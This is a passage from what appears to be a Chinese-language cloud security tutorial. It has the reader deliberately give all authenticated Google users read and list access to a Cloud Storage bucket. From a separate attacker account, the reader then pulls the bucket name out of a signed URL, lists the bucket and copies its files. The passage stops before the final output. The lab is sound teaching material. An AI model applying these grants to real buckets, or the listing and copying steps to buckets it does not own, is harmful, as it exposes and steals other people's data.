

```
gs://storage-bucket-.../cover-photo.png
gs://storage-bucket-.../data.csv
```

### 10. 检索你的 Cloud Storage 存储桶的 IAM 策略以查看其当前权限

```
gsutil iam get gs://$BUCKET_NAME
```

运行该命令输出的 JSON 类似于以下内容：

```
{
  "bindings": [
    {
      "members": [
        "projectEditor:...",
        "projectOwner:..."
      ],
      "role": "roles/storage.legacyBucketOwner"
    },
    {
      "members": [
        "projectViewer:..."
      ],
      "role": "roles/storage.legacyBucketReader"
    }
  ],
  "etag": "..."
}
```

### 11. 为所有经过身份验证的 Google 用户授予对你的 Cloud Storage 存储桶的读取和列出权限

```
gsutil iam ch allAuthenticatedUsers:objectViewer gs://$BUCKET_NAME
gsutil iam ch allAuthenticatedUsers:legacyBucketReader gs://$BUCKET_NAME
```

在这里，你是有意将存储桶配置错误，以探索过度宽松的权限如何暴露存储在 Cloud Storage 存储桶中的敏感数据。

#### Caution

请勿将此配置应用于任何工作相关或个人 Cloud Storage 存储桶。此设置仅用于练习和实验。

### 12. 再次运行以下命令以检查存储桶的当前权限

```
gsutil iam get gs://$BUCKET_NAME
```

这会产生以下输出：

```
{
  "bindings": [
    {
      "members": [
        "projectEditor:...",
        "projectOwner:..."
      ],
      "role": "roles/storage.legacyBucketOwner"
    },
    {
      "members": [
        "allAuthenticatedUsers",
        "projectViewer:..."
      ],
      "role": "roles/storage.legacyBucketReader"
    },
    {
      "members": [
        "allAuthenticatedUsers"
      ],
      "role": "roles/storage.objectViewer"
    }
  ],
  "etag": "..."
}
```

此时，由于 `allAuthenticatedUsers` 被分配了角色 `roles/storage.legacyBucketReader` 和 `roles/storage.objectViewer`，任何使用 Google 账户进行身份验证的人都应该能够列出并访问存储在存储桶中的对象。^[2](#ch08.html#id765)

现在，让我们逐步了解生成和使用签名 URL 以访问存储在存储桶中的其中一个对象（即 `cover-photo.png` 图像文件）的过程：^[3](#ch08.html#id766)

1. 运行以下命令以生成访问 `cover-photo.png` 文件的公共 URL：

```
echo "https://storage.googleapis.com/$BUCKET_NAME/cover-photo.png"
```

2. 打开一个新的浏览器标签页（或无痕/隐私窗口）并导航到上一步返回的 URL，以验证文件是否可访问。

#### Note

由于对象不是公开可访问的，尝试在浏览器中打开该 URL 将导致 `AccessDenied` 错误。

3. 切回打开 Google Cloud 控制台（Serverless Lab 账户）的浏览器标签页。

4. 创建一个将用于生成签名 URL 的服务账号：

```
SA_NAME="signurl-sa"

gcloud iam service-accounts create $SA_NAME \
  --display-name="Signing URL Service Account"
```

这会输出以下内容：

```
Created service account [signurl-sa].
```

5. 创建并下载服务账号密钥：

```
gcloud iam service-accounts keys create key.json \
  --iam-account "$SA_NAME@$PROJECT_ID.iam.gserviceaccount.com"
```

如果成功，这应返回以下输出响应：

```
created key [....] of type [json] as [key.json] for
[signurl-sa@....iam.gserviceaccount.com]
```

6. 生成一个有效期为 24 小时的签名 URL，以允许安全地临时访问 `cover-photo.png` 文件：

```
gsutil signurl -d 24h key.json gs://$BUCKET_NAME/cover-photo.png
```

你应该得到以下输出：

```
URL     HTTP Method     Expiration      Signed URL
gs://.../cover-photo.png  GET     2025-00-00 00:00:00     [LINK]
```

7. 复制生成的签名 URL 并在新的浏览器标签页中打开，使用无痕/隐私窗口。这应该会打开展示大斑点鹰的书籍封面图像。

目前，虽然看起来似乎需要签名 URL 才能访问存储桶的内容，但任何使用 Google 账户进行身份验证的人仍然可以访问存储桶内的对象。这类似于一个标有仅限授权人员进入的会议室但未上锁，允许任何持有门禁卡的人进入。同样，即使不应该有访问权限的用户也可以查看或修改 Cloud Storage 存储桶的内容，就像有人可以看到或篡改房间内的敏感文件或设备一样。

## Exploiting the Misconfigured Cloud Storage Bucket

在本节中，你将在前面的步骤基础上继续，并了解攻击者如何利用配置错误在无需签名 URL 的情况下访问存储桶的对象。为了帮助你形象化一个可能的真实场景，请考虑一名攻击者收到一封包含通过签名 URL 共享的图像的电子邮件。攻击者不仅查看图像，还会检查 URL 并核实底层存储桶是否配置错误。从这里开始，攻击者运行一系列测试，包括在没有签名 URL 的情况下访问图像、探测目录列表，并检查权限是否无意中暴露了存储桶内的对象。如果成功，攻击者可能随后能够下载存储桶中存储的所有文件，包括那些从未打算共享的文件。

#### Note

本节假设你正在使用 Attacker 账户，该账户将用于模拟攻击者尝试利用配置错误的 Cloud Storage 存储桶。

让我们逐步了解攻击者如何获得对配置错误的 Cloud Storage 存储桶中存储的对象访问权限的步骤：

1. 在新的无痕/隐私窗口中前往 [Google Cloud 控制台](https://oreil.ly/1vxJH) 并使用你的 Attacker 账户登录，如果尚未登录。或者，你也可以使用访客窗口登录，而不影响你的 Serverless Lab 账户会话。

#### Tip

确保在顶部导航栏中已选择一个项目。如果未选择项目，请打开页面顶部的项目选择器，然后选择或创建一个项目以继续。

2. 点击 Google Cloud 控制台右上角的激活 Cloud Shell 按钮 (`> _`)。如果出现授权 Cloud Shell 弹出窗口，请点击授权。

3. 将上一节生成的签名 URL 存储在变量 (`SIGNED_URL`) 中：

```
SIGNED_URL="[SPECIFY SIGNED URL]"
```

#### Note

获得签名 URL 的攻击者——例如来自电子邮件或网页——可以直接从 URL 中提取存储桶名称。

4. 从签名 URL 中提取存储桶名称并将其存储在变量 (`TARGET_BUCKET_NAME`) 中：

```
TARGET_BUCKET_NAME=$(echo "$SIGNED_URL" | awk -F'/' '{print $4}')
```

5. 检查目标存储桶是否存在：

```
gsutil ls -b gs://$TARGET_BUCKET_NAME/
```

由于目标存储桶存在，运行该命令将返回 `gs://target-bucket-name/`。

6. 列出目标存储桶的内容：

```
gsutil ls gs://$TARGET_BUCKET_NAME/
```

这会输出以下内容：

```
gs://storage-bucket-.../cover-photo.png
gs://storage-bucket-.../data.csv
```

7. 将 `cover-photo.png` 和 `data.csv` 文件从目标存储桶复制到你的当前工作目录（在 Cloud Shell 终端中）：

```
gsutil cp gs://$TARGET_BUCKET_NAME/cover-photo.png .
gsutil cp gs://$TARGET_BUCKET_NAME/data.csv .
```

这会产生以下输出日志：

